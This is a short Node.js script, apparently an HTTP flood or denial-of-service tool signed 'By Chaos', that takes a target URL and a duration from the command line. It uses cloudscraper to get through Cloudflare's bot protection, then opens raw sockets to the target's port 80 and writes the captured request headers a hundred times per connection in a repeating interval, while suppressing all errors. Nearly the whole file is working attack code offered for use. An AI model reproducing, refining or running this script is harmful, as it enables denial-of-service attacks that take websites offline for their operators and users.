const EventEmitter = require('events');
const url = require("url");
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
const cloudscraper = require("cloudscraper");
if(process.argv.length !== 4){
	console.log("By Chaos ")
	console.log("node soc.js url time")
	process.exit()
	}
var target = process.argv[2];
var time = process.argv[3];
var host = url.parse(target).host
var int = setInterval(()=>{
var config = {url:target,resolveWithFullResponse: true}
cloudscraper.get(config,(err,r)=>{
const s = require("net").Socket()
s.connect(80,host)
s.setTimeout(10000);
for(let i=0;i<100;i++){
s.write(r['request']['req']['_header'])
}
s.on('data',()=>{
setTimeout(()=>{
s.destroy()
return delete s
},5000)
})
})
setTimeout(()=>clearInterval(int),time*1000)
})
console.log("Started Attacker By Chaos !")
process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
